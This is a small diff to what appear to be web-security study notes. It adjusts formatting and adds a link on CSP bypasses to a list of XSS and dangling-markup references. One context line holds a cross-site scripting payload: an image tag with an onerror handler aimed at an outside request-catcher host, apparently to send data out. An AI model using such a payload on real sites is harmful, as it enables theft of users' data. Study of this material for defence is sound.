@@ -1,4 +1,4 @@
-  ## Doc
+## Doc
 
 - [OWASP Cheatsheet Series - Top 10](https://cheatsheetseries.owasp.org/IndexTopTen.html)
 - [Mozilla Client Docs](https://developer.mozilla.org/en-US/doc)
@@ -579,7 +579,8 @@ https://vulnerable.org?parameter=<img src=x onerror="//night.free.beeceptor.com?
 - https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
 - https://www.cobalt.io/blog/csp-and-bypasses
 - https://chromestatus.com/feature/5735596811091968
-  
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/4%20-%20CSP%20Bypass.md
+
 rappel
 
 ```js
